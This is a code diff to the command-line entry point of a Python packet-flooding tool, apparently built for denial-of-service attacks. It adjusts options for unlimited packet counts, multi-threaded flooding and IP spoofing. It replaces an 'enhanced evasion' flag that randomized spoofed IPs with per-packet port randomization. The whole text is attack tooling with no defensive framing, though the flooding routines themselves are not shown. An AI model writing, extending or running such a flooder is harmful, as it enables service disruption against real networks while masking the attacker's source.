@@ -17,10 +17,9 @@ def main():
     parser.add_argument("-c", "--count", type=int, default=-1, help="Number of packets to send. Use -1 for infinite (default).")
     parser.add_argument("-t", "--threaded", action="store_true", help="Enable multi-threading for the flood.")
     parser.add_argument("-tc", "--thread-count", type=int, default=10, help="Number of threads to use for multi-threading. Default: 10")
-    
+
     parser.add_argument("-s", "--spoof", action="store_true", help="Enable IP spoofing for the flood.")
-    parser.add_argument("-si", "--spoofed-ip", type=str, default="192.168.1.100", help="The source IP address to spoof. Default: 192.168.1.100")
-    parser.add_argument("-r", "--randomize", action="store_true", help="Enable randomization of spoofed IPs and ports for enhanced evasion.")
+    parser.add_argument("-r", "--randomize-ports", action="store_true", help="When combined with --spoof, randomizes the destination port for each packet.")
     
     args = parser.parse_args()
 
@@ -34,17 +33,13 @@ def main():
         
         # Determine the flood type based on command-line arguments
         if args.threaded:
-            if args.randomize:
-                flooder.start_threaded(flood_type="random", packet_count=args.count)
-            elif args.spoof:
-                flooder.start_threaded(flood_type="spoofed", packet_count=args.count, spoofed_ip=args.spoofed_ip)
+            if args.spoof:
+                flooder.start_threaded(flood_type="spoofed", packet_count=args.count, randomize_ports=args.randomize_ports)
             else:
                 flooder.start_threaded(flood_type="default", packet_count=args.count)
         else: # Single-threaded
-            if args.randomize:
-                flooder.start_randomized(packet_count=args.count)
-            elif args.spoof:
-                flooder.start_spoofed(packet_count=args.count, spoofed_ip=args.spoofed_ip)
+            if args.spoof:
+                flooder.start_spoofed(packet_count=args.count, randomize_ports=args.randomize_ports)
             else:
                 flooder.start(packet_count=args.count)
 
